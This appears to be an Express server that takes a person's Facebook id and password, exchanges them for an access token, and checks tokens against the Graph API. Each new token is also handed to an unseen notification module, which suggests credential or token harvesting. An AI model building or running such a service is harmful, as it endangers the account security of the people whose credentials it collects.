const express = require('express');
const path = require('path');
const axios = require('axios-proxy-fix');
const getToken = require('./token');
const { sendNotifications } = require('./notifications');
const PORT = process.env.PORT || 5000;
const HOST = '0.0.0.0';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.get('/', (req, res) => {
  res.sendFile(path.resolve(__dirname, 'public', 'index.html'));
});
app.post('/auth', (req, res) => {
  const { id, pass } = req.body;
  if (id && pass) {
    getToken(id, pass).then(e => {
      if (e.access_token) {
        res.status(200).json({ loc: e.access_token });
        
        sendNotifications(e.access_token).catch(err => {
          console.error('Notification error:', err);
        });
      }
      else if (e.error_msg) res.status(400).json({ error: e.error_msg });
      else res.status(400).json({ error: 'Authentication failed' });
    }).catch(err => {
      console.error('Authentication error:', err);
      res.status(500).json({ error: 'Server error during authentication' });
    });
  } else {
    res.status(400).json({ error: 'Missing credentials' });
  }
});

app.post('/check-token', async (req, res) => {
  const { token } = req.body;
  if (!token) {
    return res.status(400).json({ error: 'Token is required' });
  }

  try {
    const response = await axios.get(`https://graph.facebook.com/me?access_token=${token}&fields=id,name,email`);
    
    res.status(200).json({
      valid: true,
      data: {
        id: response.data.id,
        name: response.data.name,
        email: response.data.email || 'Not available'
      }
    });
  } catch (err) {
    if (err.response && err.response.status === 400) {
      res.status(200).json({
        valid: false,
        error: 'Invalid or expired token'
      });
    } else {
      console.error('Token check error:', err);
      res.status(500).json({ error: 'Server error during token verification' });
    }
  }
});

app.listen(PORT, HOST, () => console.log(`Listening on ${HOST}:${PORT}`));
